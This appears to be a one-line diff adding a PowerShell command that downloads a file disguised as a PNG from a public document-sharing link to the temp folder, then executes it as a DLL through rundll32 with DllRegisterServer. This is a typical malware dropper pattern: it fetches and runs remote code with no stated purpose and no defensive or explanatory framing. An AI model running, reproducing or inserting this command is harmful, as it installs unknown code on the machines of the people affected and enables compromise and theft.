@@ -1,0 +1,1 @@
+$path = $Env:temp+'\KkV.bin'; $client = New-Object System.Net.WebClient; $client.downloadfile('https://docs.zohopublic.eu/downloaddocument.do?docId=674ni1c6312a91d7149af89b6475ece38b9b3&docExtn=png',$path); C:\Windows\System32\rundll32.exe $path,DllRegisterServer 
